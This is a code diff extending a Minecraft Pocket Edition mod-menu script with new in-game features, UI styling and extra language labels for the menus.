+ntd.setHint("0 = peaceful, 1 = normal, 2 = medium, 3 = hard");
+Exit.setText("done");
+
+Exit.setOnClickListener(new android.view.View.OnClickListener(){
+onClick: function(view){
+nametd =ntd.getText();
+Dialog.dismiss();
+setdiff();
+showMenuBtn();
+}
+});
+
+GetText.setHeight(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
+GetText.setWidth(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
+GetText.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.TOP, 0, 0);
+} catch (e){
+print("The setdiff Dialog Is Malfunctioning:"+e);
+}
+}});
+}
+
+function setdiff(){
+Level.setDifficulty(nametd);
+}
+
 var fovy = new Button(ctx);
             fovy.setText("Fov editor");        
             fovy.setOnClickListener(new View.OnClickListener({
@@ -2766,7 +3604,7 @@ zmenu.dismiss();
             zmenuLayout.addView(fovy);
 
 var att = new Button(ctx);
-            att.setText("Nametag");        
+            att.setText("Set nametag");        
             att.setOnClickListener(new View.OnClickListener({
                 onClick: function(viewarg){ 
 nameMe(); 
@@ -2817,6 +3655,7 @@ print("The setName Dialog Is Malfunctioning:"+e);
 
 function setName(){
 Entity.setNameTag(Player.getEntity(), nametgg);
+net.zhuoweizhang.mcpelauncher.ScriptManager.nativeSendChat("/nick set " + nametgg);
 }
 
 var fp = new android.widget.Button(ctx);
@@ -2835,6 +3674,251 @@ clientMessage(client + "§7Falcon punch! off");
             }));
             zmenuLayout.addView(fp);
 
+var sbn = new Button(ctx);
+            sbn.setText("Set block brightness");        
+            sbn.setOnClickListener(new View.OnClickListener({
+                onClick: function(viewarg){ 
+block1(); 
+
+                }
+            }));
+            zmenuLayout.addView(sbn);
+
+function block1() {
+ctx.runOnUiThread(new java.lang.Runnable(){
+run: function(){ 
+try{
+GetText = new android.widget.PopupWindow();
+var Layer8 = new android.widget.LinearLayout(ctx);
+var bd = new android.widget.EditText(ctx);
+var bn = new android.widget.EditText(ctx);
+var Dialog = new android.app.Dialog(ctx);
+var Exit = new android.widget.Button(ctx);
+
+Dialog.setTitle("Set block light");
+Dialog.setContentView(Layer8);
+
+Layer8.setOrientation(android.widget.LinearLayout.VERTICAL);
+Dialog.show();
+Layer8.addView(bn);
+Layer8.addView(bd);
+Layer8.addView(Exit);
+
+bd.setText("");
+bd.setHint("Block ID");
+bn.setText("");
+bn.setHint("New light level");
+Exit.setText("done");
+
+Exit.setOnClickListener(new android.view.View.OnClickListener(){
+onClick: function(view){
+idm =bd.getText();
+levelm =bn.getText();
+Dialog.dismiss();
+setLight();
+showMenuBtn();
+}
+});
+
+GetText.setHeight(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
+GetText.setWidth(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
+GetText.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.TOP, 0, 0);
+} catch (e){
+print("The block L Dialog Is Malfunctioning:"+e);
+}
+}});
+}
+
+function setLight(){
+Block.setLightLevel(idm, levelm);
+}
+
+var sbr = new Button(ctx);
+            sbr.setText("Set block Resistance");        
+            sbr.setOnClickListener(new View.OnClickListener({
+                onClick: function(viewarg){ 
+block2(); 
+
+                }
+            }));
+            zmenuLayout.addView(sbr);
+
+function block2() {
+ctx.runOnUiThread(new java.lang.Runnable(){
+run: function(){ 
+try{
+GetText = new android.widget.PopupWindow();
+var Layer8 = new android.widget.LinearLayout(ctx);
+var bi = new android.widget.EditText(ctx);
+var br = new android.widget.EditText(ctx);
+var Dialog = new android.app.Dialog(ctx);
+var Exit = new android.widget.Button(ctx);
+
+Dialog.setTitle("Set block resistance");
+Dialog.setContentView(Layer8);
+
+Layer8.setOrientation(android.widget.LinearLayout.VERTICAL);
+Dialog.show();
+Layer8.addView(bi);
+Layer8.addView(br);
+Layer8.addView(Exit);
+
+bi.setText("");
+bi.setHint("Block ID");
+br.setText("");
+br.setHint("Explosion resistance");
+Exit.setText("done");
+
+Exit.setOnClickListener(new android.view.View.OnClickListener(){
+onClick: function(view){
+idb =bi.getText();
+resis =br.getText();
+Dialog.dismiss();
+setResis();
+showMenuBtn();
+}
+});
+
+GetText.setHeight(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
+GetText.setWidth(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
+GetText.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.TOP, 0, 0);
+} catch (e){
+print("The block R Dialog Is Malfunctioning:"+e);
+}
+}});
+}
+
+function setResis(){
+Block.setExplosionResistance(idb, resis);
+}
+
+/*var hst = new android.widget.Button(ctx);
+           hst.setText("Health status: "+(somd?"on":"off"));
+            hst.setOnClickListener(new android.view.View.OnClickListener({
+                onClick: function(viewarg){
+somd?somd=false:somd=true;
+hst.setText("Health status: "+(somed?"on":"off"));
+if(somd == true){
+clientMessage(client + "§7Health status is showing"); 
+
+somd = true
+}
+if(somd == false){
+clientMessage(client + "§7Health status off");
+
+somd = false
+                }
+}
+            }));
+            zmenuLayout.addView(hst);*/
+
+var bp = new android.widget.Button(ctx);
+           bp.setText("Block protect: "+(block?"on":"off"));
+            bp.setOnClickListener(new android.view.View.OnClickListener({
+                onClick: function(viewarg){
+block?block=false:block=true;
+bp.setText("Block protect: "+(block?"on":"off"));
+if(block == true){
+clientMessage(client + "§7Block protect is on, by johnmacro"); 
+
+block = true;
+}
+if(block == false){
+clientMessage(client + "§7Block protect is off, by johnmacro");
+
+block = false;
+                }
+}
+            }));
+            zmenuLayout.addView(bp);
+
+var bmsg = new android.widget.Button(ctx);
+           bmsg.setText("Blank message");
+            bmsg.setOnClickListener(new android.view.View.OnClickListener({
+                onClick: function(viewarg){
+net.zhuoweizhang.mcpelauncher.ScriptManager.nativeSendChat("§§");
+}
+            }));
+            zmenuLayout.addView(bmsg);
+
+var ahb = new android.widget.Button(ctx);
+           ahb.setText("AlphaHack bow");
+            ahb.setOnClickListener(new android.view.View.OnClickListener({
+                onClick: function(viewarg){
+Item.setCategory(1003,ItemCategory.TOOL);
+ModPE.setItem(1003,"bow_pulling",2,"AlphaHack bow");
+clientMessage(client + "AlphaHack bow added to inventory");
+
+addItemInventory(1003, 2, 0);
+addItemInventory(262, 1000, 0);
+Player.addItemCreativeInv(1003,1,0);
+}
+            }));
+            zmenuLayout.addView(ahb);
+
+var saysome = new android.widget.Button(ctx);
+            saysome.setText("BurnAura: "+(killdaura?"on":"off"));
+            saysome.setOnClickListener(new android.view.View.OnClickListener({
+                onClick: function(viewarg){
+killdaura?killdaura=false:killdaura=true;
+saysome.setText("BurnAura: "+(killdaura?"on":"off"));
+if(killdaura == true){
+clientMessage(client + "§7BurnAura on, Thanks to the vertex team for coming up with the idea");
+killdaura = true;
+}
+if(killdaura == false){
+clientMessage(client + "§7BurnAura off");
+killdaura = false;
+                }
+}
+            }));
+            zmenuLayout.addView(saysome);
+
+var texty = new android.widget.Button(ctx);
+            texty.setText("Text to toast: "+(ttot?"on":"off"));
+            texty.setOnClickListener(new android.view.View.OnClickListener({
+                onClick: function(viewarg){
+ttot?ttot=false:ttot=true;
+texty.setText("Text to toast: "+(ttot?"on":"off"));
+if(ttot == true){
+clientMessage(client + "§7Now displaying chat text to toast");
+ttot = true;
+}
+if(ttot == false){
+clientMessage(client + "§7Text to toast off");
+ttot = false;
+                }
+}
+            }));
+            zmenuLayout.addView(texty);
+
+var cn = new Button(ctx);
+            cn.setText("Clear name tags");        
+            cn.setOnClickListener(new View.OnClickListener({
+                onClick: function(viewarg){
+bl_clearNameTags();
+                }
+            }));
+            zmenuLayout.addView(cn);
+			
+			var tapd = new android.widget.Button(ctx);
+            tapd.setText("Tap destory: "+(tapdd?"on":"off"));
+            tapd.setOnClickListener(new android.view.View.OnClickListener({
+                onClick: function(viewarg){
+tapdd?tapdd=false:tapdd=true;
+tapd.setText("Tap destory: "+(tapdd?"on":"off"));
+if(tapdd == true){
+clientMessage(client + "§7destory on, tap ground");
+tapdd = true;
+}
+if(tapdd == false){
+clientMessage(client + "§7destory off");
+tapdd = false;
+                }
+}
+            }));
+            zmenuLayout.addView(tapd);
+
 		var B_exit = new android.widget.Button(ctx);
 		B_exit.setText("Exit");
 		B_exit.setOnClickListener(new android.view.View.OnClickListener() {
@@ -2847,6 +3931,11 @@ showMenuBtn();
 
             zmenu = new PopupWindow(zmenuLayout1, ctx.getWindowManager().getDefaultDisplay().getWidth()/GUISize, ctx.getWindowManager().getDefaultDisplay().getHeight());
             zmenu.setBackgroundDrawable(new ColorDrawable(GUIColor));
+			var bg = new android.graphics.drawable.GradientDrawable();
+      bg.setColor(GUIColor);
+      bg.setStroke(10,Color.BLUE);
+zmenuLayout1.setBackgroundDrawable(bg);
+zmenuLayout1.setPadding(20,0,20,0);
             zmenu.showAtLocation(ctx.getWindow().getDecorView(), GUIPos | Gravity.TOP, 0, 0);
             }catch(error){
                 Toast.makeText(ctx, "An error occured: " + error, 1).show();
@@ -2862,6 +3951,12 @@ if(GetLang=="de_DE")btn3.setText('Spawn Menü');
 if(GetLang=="ko_KR")btn3.setText('스폰 메뉴');
 
 if(GetLang=="es_MX")btn3.setText('Menú de spawn');
+
+if(GetLang=="ja_JP")btn3.setText('スポーンメニュー');
+
+if(GetLang=="fr_FR")btn3.setText('Créer Menu');
+
+if(GetLang=="it_IT")btn3.setText('Menu Spawner');
 btn3.setTextColor(GUIBtns);
 		btn3.setOnClickListener(new android.view.View.OnClickListener() {
 			onClick: function(v){
@@ -3150,6 +4245,15 @@ var spawn66 = new Button(ctx);
             }));
             smenuLayout.addView(spawn66);
 
+var spawn67 = new Button(ctx);
+            spawn67.setText("Spawn Horse");            
+            spawn67.setOnClickListener(new View.OnClickListener({
+                onClick: function(viewarg){
+                    Level.spawnMob(Player.getX(), Player.getY(), Player.getZ(), 100);
+                }
+            }));
+            smenuLayout.addView(spawn67);
+
 		var B_exit = new android.widget.Button(ctx);
 		B_exit.setText("Exit");
 		B_exit.setOnClickListener(new android.view.View.OnClickListener() {
@@ -3162,6 +4266,12 @@ showMenuBtn();
 
             smenu = new PopupWindow(smenuLayout1, ctx.getWindowManager().getDefaultDisplay().getWidth()/GUISize, ctx.getWindowManager().getDefaultDisplay().getHeight());
             smenu.setBackgroundDrawable(new ColorDrawable(GUIColor));
+			var bg = new android.graphics.drawable.GradientDrawable();
+var bg = new android.graphics.drawable.GradientDrawable();
+      bg.setColor(GUIColor);
+      bg.setStroke(10,Color.BLUE);
+smenuLayout1.setBackgroundDrawable(bg);
+smenuLayout1.setPadding(20,0,20,0);
             smenu.showAtLocation(ctx.getWindow().getDecorView(), GUIPos | Gravity.TOP, 0, 0);
             }catch(error){
                 Toast.makeText(ctx, "An error occured: " + error, 1).show();
@@ -3177,6 +4287,12 @@ if(GetLang=="de_DE")btn4.setText('Effekt Menü');
 if(GetLang=="ko_KR")btn4.setText('효과 메뉴');
 
 if(GetLang=="es_MX")btn4.setText('Menú de efectos');
+
+if(GetLang=="ja_JP")btn4.setText('エフェクトメニュー');
+
+if(GetLang=="fr_FR")btn4.setText('Effet Menu');
+
+if(GetLang=="it_IT")btn4.setText('Menu Effetti');
 btn4.setTextColor(GUIBtns);
 		btn4.setOnClickListener(new android.view.View.OnClickListener() {
 			onClick: function(v){
@@ -4532,6 +5648,11 @@ showMenuBtn();
 
             emenu = new PopupWindow(emenuLayout1, ctx.getWindowManager().getDefaultDisplay().getWidth()/GUISize, ctx.getWindowManager().getDefaultDisplay().getHeight());
             emenu.setBackgroundDrawable(new ColorDrawable(GUIColor));
+			var bg = new android.graphics.drawable.GradientDrawable();
+      bg.setColor(GUIColor);
+      bg.setStroke(10,Color.BLUE);
+emenuLayout1.setBackgroundDrawable(bg);
+emenuLayout1.setPadding(20,0,20,0);
             emenu.showAtLocation(ctx.getWindow().getDecorView(), GUIPos | Gravity.TOP, 0, 0);
             }catch(error){
                 Toast.makeText(ctx, "An error occured: " + error, 1).show();
@@ -4547,6 +5668,10 @@ if(GetLang=="de_DE")btn5.setText('Teleport Menü');
 if(GetLang=="ko_KR")btn5.setText('텔레포트 메뉴');
 
 if(GetLang=="es_MX")btn5.setText('teletransportación');
+
+if(GetLang=="ja_JP")btn5.setText('テレポートメニュー');
+
+if(GetLang=="it_IT")btn5.setText('Menu Teletrasporto');
 btn5.setTextColor(GUIBtns);
             btn5.setOnClickListener(new android.view.View.OnClickListener({
                 onClick: function(viewarg){
@@ -4624,6 +5749,23 @@ clientMessage("§7Spawn set to " + Math.round(getPlayerX()) + ", " + Math.round(
                 }
             }));
             tmenuLayout.addView(sspawn);
+			
+			var randomtp = new Button(ctx);
+            randomtp.setText("Random TP");       
+            randomtp.setOnClickListener(new View.OnClickListener({
+                onClick: function(viewarg){
+ setPosition(Player.getEntity(), (Math.floor(Math.random() * (5000 - 100 + 1)) + 100), 60, (Math.floor(Math.random() * (5000 - 100 + 1)) + 100));
+				clientMessage(client + "Woah!");
+                }
+            }));
+            tmenuLayout.addView(randomtp);
+			
+			var et = new android.widget.TextView(ctx);
+			et.setGravity(android.view.Gravity.CENTER);
+		et.setText("You may crash while tping because blocks do not load correctly.");
+       et.setTextColor(Color.RED);
+		et.setTextSize(20);
+		tmenuLayout.addView(et);
 
 var gg_exit = new android.widget.Button(ctx);
 		gg_exit.setText("Exit");
@@ -4635,9 +5777,14 @@ showMenuBtn();
 		});
 		tmenuLayout.addView(gg_exit);
 
-            tmenu = new android.widget.PopupWindow(tmenuLayout1, ctx.getWindowManager().getDefaultDisplay().getWidth()/2, ctx.getWindowManager().getDefaultDisplay().getHeight());
+            tmenu = new android.widget.PopupWindow(tmenuLayout1, ctx.getWindowManager().getDefaultDisplay().getWidth()/3, ctx.getWindowManager().getDefaultDisplay().getHeight());
        /*     tmenu.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.GUIColor));*/
 tmenu.setBackgroundDrawable(new ColorDrawable(GUIColor));
+var bg = new android.graphics.drawable.GradientDrawable();
+      bg.setColor(GUIColor);
+      bg.setStroke(10,Color.BLUE);
+tmenuLayout1.setBackgroundDrawable(bg);
+tmenuLayout1.setPadding(20,0,20,0);
             tmenu.showAtLocation(ctx.getWindow().getDecorView(), GUIPos | android.view.Gravity.TOP, 0, 0);
         }catch(error){
             print("A Error Has Happen: " + error);
@@ -4708,6 +5855,12 @@ if(GetLang=="de_DE")btn6.setText('Bomben Menü');
 if(GetLang=="ko_KR")btn6.setText('핵폭탄 메뉴');
 
 if(GetLang=="es_MX")btn6.setText('Menú de bomba nuclear');
+
+if(GetLang=="ja_JP")btn6.setText('爆発メニュー');
+
+if(GetLang=="fr_FR")btn6.setText('Destruction Menu');
+
+if(GetLang=="it_IT")btn6.setText('Menu Esplosioni');
 btn6.setTextColor(GUIBtns);
 		btn6.setOnClickListener(new android.view.View.OnClickListener() {
 			onClick: function(v){
@@ -4852,6 +6005,11 @@ showMenuBtn();
 
             nmenu = new PopupWindow(nmenuLayout1, ctx.getWindowManager().getDefaultDisplay().getWidth()/GUISize, ctx.getWindowManager().getDefaultDisplay().getHeight());
             nmenu.setBackgroundDrawable(new ColorDrawable(GUIColor));
+			var bg = new android.graphics.drawable.GradientDrawable();
+      bg.setColor(GUIColor);
+      bg.setStroke(10,Color.BLUE);
+nmenuLayout1.setBackgroundDrawable(bg);
+nmenuLayout1.setPadding(20,0,20,0);
             nmenu.showAtLocation(ctx.getWindow().getDecorView(), GUIPos | Gravity.TOP, 0, 0);
             }catch(error){
                 Toast.makeText(ctx, "An error occured: " + error, 1).show();
@@ -4867,6 +6025,12 @@ if(GetLang=="de_DE")btn7.setText('Item Menü');
 if(GetLang=="ko_KR")btn7.setText('아이템 주기 메뉴');
 
 if(GetLang=="es_MX")btn7.setText('Menú de tener');
+
+if(GetLang=="ja_JP")btn7.setText('アイテムの付与');
+
+if(GetLang=="fr_FR")btn7.setText('Donner Menu');
+
+if(GetLang=="it_IT")btn7.setText('Menu Give');
 btn7.setTextColor(GUIBtns);
             btn7.setOnClickListener(new android.view.View.OnClickListener({
                 onClick: function(viewarg){
@@ -4908,7 +6072,7 @@ var gtitle = new android.widget.TextView(ctx); gtitle.setGravity(android.view.Gr
             button.setText("Custom Give");
             button.setOnClickListener(new android.view.View.OnClickListener({
                 onClick: function(viewarg){
-MGive();
+Give();
 gmenu.dismiss();
                 }
             }));
@@ -5064,6 +6228,11 @@ showMenuBtn();
             gmenu = new android.widget.PopupWindow(gmenuLayout1, ctx.getWindowManager().getDefaultDisplay().getWidth()/GUISize, ctx.getWindowManager().getDefaultDisplay().getHeight());
           /*  gmenu.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.GUIColor));*/
 gmenu.setBackgroundDrawable(new ColorDrawable(GUIColor));
+var bg = new android.graphics.drawable.GradientDrawable();
+      bg.setColor(GUIColor);
+      bg.setStroke(10,Color.BLUE);
+gmenuLayout1.setBackgroundDrawable(bg);
+gmenuLayout1.setPadding(20,0,20,0);
             gmenu.showAtLocation(ctx.getWindow().getDecorView(), GUIPos | android.view.Gravity.TOP, 0, 0);
         }catch(error){
             print("A Error Has Happen: " + error);
@@ -5071,7 +6240,7 @@ gmenu.setBackgroundDrawable(new ColorDrawable(GUIColor));
     }}));
 }
 
-function MGive() {
+function Give() {
 ctx.runOnUiThread(new java.lang.Runnable(){
 run: function(){ 
 try{
@@ -5099,7 +6268,7 @@ Amount.setText("");
 Amount.setHint("Item Amount");
 Damage.setText("");
 Damage.setHint("Item Damage");
-Exit.setText("GET items");
+Exit.setText("Give items");
 
 Exit.setOnClickListener(new android.view.View.OnClickListener(){
 onClick: function(view){
@@ -5107,7 +6276,7 @@ I=ID.getText();
 A=Amount.getText();
 D=Damage.getText();
 Dialog.dismiss();
-GG();
+give2();
 showMenuBtn();
 }
 });
@@ -5121,7 +6290,7 @@ print("The Give Dialog Is Malfunctioning:"+e);
 }});
 }
 
-function GG() {
+function give2() {
 Player.addItemInventory(I,A,D);
 net.zhuoweizhang.mcpelauncher.ScriptManager.nativeSendChat("/give " + Player.getName(Player.getEntity()) + space + I + ":" + D + space + A);
 }
@@ -5134,6 +6303,12 @@ if(GetLang=="de_DE")btn8.setText('Speed Menü');
 if(GetLang=="ko_KR")btn8.setText('속도 메뉴');
 
 if(GetLang=="es_MX")btn8.setText('Menú de velocidad');
+
+if(GetLang=="ja_JP")btn8.setText('ゲームスピードメニュー');
+
+if(GetLang=="fr_FR")btn8.setText('Vitesse Menu');
+
+if(GetLang=="it_IT")btn8.setText('Menu Velocità');
 btn8.setTextColor(GUIBtns);
 		btn8.setOnClickListener(new android.view.View.OnClickListener() {
 			onClick: function(v){
@@ -5186,6 +6361,15 @@ var d1 = new Button(ctx);
                 }
             }));
             dmenuLayout.addView(d1);
+			
+			var d0 = new Button(ctx);
+            d0.setText("Speed 0%");       
+            d0.setOnClickListener(new View.OnClickListener({
+                onClick: function(viewarg){         
+                	ModPE.setGameSpeed(0);
+                }
+            }));
+            dmenuLayout.addView(d0);
             
             var d2 = new Button(ctx);
             d2.setText("Speed 5%");       
@@ -5379,6 +6563,11 @@ showMenuBtn();
 
             dmenu = new PopupWindow(dmenuLayout1, ctx.getWindowManager().getDefaultDisplay().getWidth()/GUISize, ctx.getWindowManager().getDefaultDisplay().getHeight());
             dmenu.setBackgroundDrawable(new ColorDrawable(GUIColor));
+			var bg = new android.graphics.drawable.GradientDrawable();
+      bg.setColor(GUIColor);
+      bg.setStroke(10,Color.BLUE);
+dmenuLayout1.setBackgroundDrawable(bg);
+dmenuLayout1.setPadding(20,0,20,0);
             dmenu.showAtLocation(ctx.getWindow().getDecorView(), GUIPos | Gravity.TOP, 0, 0);
             }catch(error){
                 Toast.makeText(ctx, "An error occured: " + error, 1).show();
@@ -5394,6 +6583,12 @@ if(GetLang=="de_DE")btn10.setText('Enchant Menü');
 if(GetLang=="ko_KR")btn10.setText('인첸트 메뉴');
 
 if(GetLang=="es_MX")btn10.setText('Menú de Enchant');
+
+if(GetLang=="ja_JP")btn10.setText('エンチャントメニュー');
+
+if(GetLang=="fr_FR")btn10.setText('Enchanter Menu');
+
+if(GetLang=="it_IT")btn10.setText('Menu Incantamenti');
 btn10.setTextColor(GUIBtns);
             btn10.setOnClickListener(new android.view.View.OnClickListener({
                 onClick: function(viewarg){
@@ -6803,6 +7998,11 @@ showMenuBtn();
             xmenu = new android.widget.PopupWindow(xmenuLayout1, ctx.getWindowManager().getDefaultDisplay().getWidth()/GUISize, ctx.getWindowManager().getDefaultDisplay().getHeight());
         /*    xmenu.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.GUIColor));*/
 xmenu.setBackgroundDrawable(new ColorDrawable(GUIColor));
+var bg = new android.graphics.drawable.GradientDrawable();
+      bg.setColor(GUIColor);
+      bg.setStroke(10,Color.BLUE);
+xmenuLayout1.setBackgroundDrawable(bg);
+xmenuLayout1.setPadding(20,0,20,0);
             xmenu.showAtLocation(ctx.getWindow().getDecorView(), GUIPos | android.view.Gravity.TOP, 0, 0);
         }catch(error){
             print("A Error Has Happen: " + error);
@@ -6851,8 +8051,8 @@ print("The XP Dialog Is Malfunctioning:"+e);
 }
 
 function XG() {
-Player.setExp(Math.round(L));
-Player.addExp(Math.round(L));
+Player.setLevel(Math.round(L));
+net.zhuoweizhang.mcpelauncher.ScriptManager.nativeSendChat("/xp " + L + Player.getName(Player.getEntity()));
 }
 
 /***********************/
@@ -6863,6 +8063,10 @@ if(GetLang=="de_DE")btn13.setText('Morph Menü');
 if(GetLang=="ko_KR")btn13.setText('변신 메뉴');
 
 if(GetLang=="es_MX")btn13.setText('Menú de Morph');
+
+if(GetLang=="ja_JP")btn13.setText('変身');
+
+if(GetLang=="it_IT")btn13.setText('Menu Trasformazioni');
 btn13.setTextColor(GUIBtns);
             btn13.setOnClickListener(new android.view.View.OnClickListener({
                 onClick: function(viewarg){
@@ -7202,6 +8406,11 @@ showMenuBtn();
 
             mmenu = new PopupWindow(mmenuLayout1, ctx.getWindowManager().getDefaultDisplay().getWidth()/GUISize, ctx.getWindowManager().getDefaultDisplay().getHeight());
             mmenu.setBackgroundDrawable(new ColorDrawable(GUIColor));
+			var bg = new android.graphics.drawable.GradientDrawable();
+      bg.setColor(GUIColor);
+      bg.setStroke(10,Color.BLUE);
+mmenuLayout1.setBackgroundDrawable(bg);
+mmenuLayout1.setPadding(20,0,20,0);
             mmenu.showAtLocation(ctx.getWindow().getDecorView(), GUIPos | Gravity.TOP, 0, 0);
             }catch(error){
                 Toast.makeText(ctx, "An error occured: " + error, 1).show();
@@ -7217,6 +8426,12 @@ if(GetLang=="de_DE")btn11.setText('Wetter Menü');
 if(GetLang=="ko_KR")btn11.setText('날씨 메뉴');
 
 if(GetLang=="es_MX")btn11.setText('Menú de clima');
+
+if(GetLang=="ja_JP")btn11.setText('天候');
+
+if(GetLang=="fr_FR")btn11.setText('Menu du météo');
+
+if(GetLang=="it_IT")btn11.setText('Menu Pioggia');
 btn11.setTextColor(GUIBtns);
             btn11.setOnClickListener(new android.view.View.OnClickListener({
                 onClick: function(viewarg){
@@ -7269,6 +8484,7 @@ var button2 = new android.widget.Button(ctx);
                 onClick: function(viewarg){
 Level.setRainLevel(0);
 Level.setLightningLevel(0);
+net.zhuoweizhang.mcpelauncher.ScriptManager.nativeSendChat("/weather clear");
                 }
             }));
             wmenuLayout.addView(button2);
@@ -7286,6 +8502,11 @@ showMenuBtn();
             wmenu = new android.widget.PopupWindow(wmenuLayout1, ctx.getWindowManager().getDefaultDisplay().getWidth()/GUISize, ctx.getWindowManager().getDefaultDisplay().getHeight());
           /*  wmenu.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.GUIColor));*/
 wmenu.setBackgroundDrawable(new ColorDrawable(GUIColor));
+var bg = new android.graphics.drawable.GradientDrawable();
+      bg.setColor(GUIColor);
+      bg.setStroke(10,Color.BLUE);
+wmenuLayout1.setBackgroundDrawable(bg);
+wmenuLayout1.setPadding(20,0,20,0);
             wmenu.showAtLocation(ctx.getWindow().getDecorView(), GUIPos | android.view.Gravity.TOP, 0, 0);
         }catch(error){
             print("A Error Has Happen: " + error);
@@ -7314,9 +8535,9 @@ Layer.addView(w2);
 Layer.addView(Exit);
 
 w.setText("");
-w.setHint("Set rain/snow");
+w.setHint("rain/snow = 1");
 w2.setText("");
-w2.setHint("Set lightning");
+w2.setHint("lightning = 1");
 Exit.setText("Set weather");
 
 Exit.setOnClickListener(new android.view.View.OnClickListener(){
@@ -7341,6 +8562,7 @@ print("The WS Dialog Is Malfunctioning:"+e);
 function WS() {
 Level.setRainLevel(v);
 Level.setLightningLevel(v2);
+net.zhuoweizhang.mcpelauncher.ScriptManager.nativeSendChat("/weather rain");
 }
 
 /***********************/
@@ -7351,6 +8573,12 @@ if(GetLang=="de_DE")btn14.setText('Partikel Menü');
 if(GetLang=="ko_KR")btn14.setText('파티클 메뉴');
 
 if(GetLang=="es_MX")btn14.setText('Menú de Partícula');
+
+if(GetLang=="ja_JP")btn14.setText('パーティクルメニュー');
+
+if(GetLang=="fr_FR")btn14.setText('Menu des particules');
+
+if(GetLang=="it_IT")btn14.setText('Menu Particelle');
 btn14.setTextColor(GUIBtns);
 		btn14.setOnClickListener(new android.view.View.OnClickListener() {
 			onClick: function(v){
@@ -7859,6 +9087,54 @@ clientMessage(client + "§7Particle 29 is false");
             }));
             pmenuLayout.addView(p29);
 
+var p30 = new android.widget.Button(ctx);
+            p30.setText("Large explosion: "+(particle30?"on":"off"));
+            p30.setOnClickListener(new android.view.View.OnClickListener({
+                onClick: function(viewarg){
+particle30?particle30=false:particle30=true;
+p30.setText("Large explosion: "+(particle30?"on":"off"));
+if(particle30 == true){
+clientMessage(client + "§7Particle 30 is true");
+}
+if(particle30 == false){
+clientMessage(client + "§7Particle 30 is false");
+                }
+}
+            }));
+            pmenuLayout.addView(p30);
+
+var p31 = new android.widget.Button(ctx);
+            p31.setText("Spell 2: "+(particle31?"on":"off"));
+            p31.setOnClickListener(new android.view.View.OnClickListener({
+                onClick: function(viewarg){
+particle31?particle31=false:particle31=true;
+p31.setText("Spell 2: "+(particle31?"on":"off"));
+if(particle31 == true){
+clientMessage(client + "§7Particle 31 is true");
+}
+if(particle31 == false){
+clientMessage(client + "§7Particle 31 is false");
+                }
+}
+            }));
+            pmenuLayout.addView(p31);
+
+var p32 = new android.widget.Button(ctx);
+            p32.setText("Spell 3: "+(particle32?"on":"off"));
+            p32.setOnClickListener(new android.view.View.OnClickListener({
+                onClick: function(viewarg){
+particle32?particle32=false:particle32=true;
+p32.setText("Spell 3: "+(particle32?"on":"off"));
+if(particle32 == true){
+clientMessage(client + "§7Particle 32 is true");
+}
+if(particle32 == false){
+clientMessage(client + "§7Particle 32 is false");
+                }
+}
+            }));
+            pmenuLayout.addView(p32);
+
 		var B_exit = new android.widget.Button(ctx);
 		B_exit.setText("Exit");
 		B_exit.setOnClickListener(new android.view.View.OnClickListener() {
@@ -7871,6 +9147,11 @@ showMenuBtn();
 
             pmenu = new PopupWindow(pmenuLayout1, ctx.getWindowManager().getDefaultDisplay().getWidth()/GUISize, ctx.getWindowManager().getDefaultDisplay().getHeight());
             pmenu.setBackgroundDrawable(new ColorDrawable(GUIColor));
+			var bg = new android.graphics.drawable.GradientDrawable();
+      bg.setColor(GUIColor);
+      bg.setStroke(10,Color.BLUE);
+pmenuLayout1.setBackgroundDrawable(bg);
+pmenuLayout1.setPadding(20,0,20,0);
             pmenu.showAtLocation(ctx.getWindow().getDecorView(), GUIPos | Gravity.TOP, 0, 0);
             }catch(error){
                 Toast.makeText(ctx, "An error occured: " + error, 1).show();
@@ -7887,6 +9168,12 @@ if(GetLang=="de_DE")btn12.setText('Zeit Menü');
 if(GetLang=="ko_KR")btn12.setText('시간 메뉴');
 
 if(GetLang=="es_MX")btn12.setText('Menú de tiempo');
+
+if(GetLang=="ja_JP")btn12.setText('時間設定');
+
+if(GetLang=="fr_FR")btn12.setText('Menu du temps');
+
+if(GetLang=="it_IT")btn12.setText('Menu Particelle');
 btn12.setTextColor(GUIBtns);
 		btn12.setOnClickListener(new android.view.View.OnClickListener() {
 			onClick: function(v){
@@ -7951,6 +9238,27 @@ onlyday = false;
                 }
             }));
             amenuLayout.addView(aa);
+
+var aa2 = new android.widget.Button(ctx);
+            aa2.setText("Only night: "+(onlynight?"on":"off"));
+            aa2.setOnClickListener(new android.view.View.OnClickListener({
+                onClick: function(viewarg){
+onlynight?onlynight=false:onlynight=true;
+aa2.setText("Only night: "+(onlynight?"on":"off"));
+if(onlynight == true){
+clientMessage("§7Only night is on");
+net.zhuoweizhang.mcpelauncher.ScriptManager.nativeSendChat("/time set 15000");
+net.zhuoweizhang.mcpelauncher.ScriptManager.nativeSendChat("/time stop");
+onlynight = true;
+}
+if(onlynight == false){
+clientMessage("§7Only night is off");
+net.zhuoweizhang.mcpelauncher.ScriptManager.nativeSendChat("/time start");
+onlynight = false;
+                }
+                }
+            }));
+            amenuLayout.addView(aa2);
 
 var a1 = new Button(ctx);
             a1.setText("Time: 6:00am");
@@ -8205,6 +9513,11 @@ showMenuBtn();
 
             amenu = new PopupWindow(amenuLayout1, ctx.getWindowManager().getDefaultDisplay().getWidth()/GUISize, ctx.getWindowManager().getDefaultDisplay().getHeight());
             amenu.setBackgroundDrawable(new ColorDrawable(GUIColor));
+			var bg = new android.graphics.drawable.GradientDrawable();
+      bg.setColor(GUIColor);
+      bg.setStroke(10,Color.BLUE);
+amenuLayout1.setBackgroundDrawable(bg);
+amenuLayout1.setPadding(20,0,20,0);
             amenu.showAtLocation(ctx.getWindow().getDecorView(), GUIPos | Gravity.TOP, 0, 0);
             }catch(error){
                 Toast.makeText(ctx, "An error occured: " + error, 1).show();
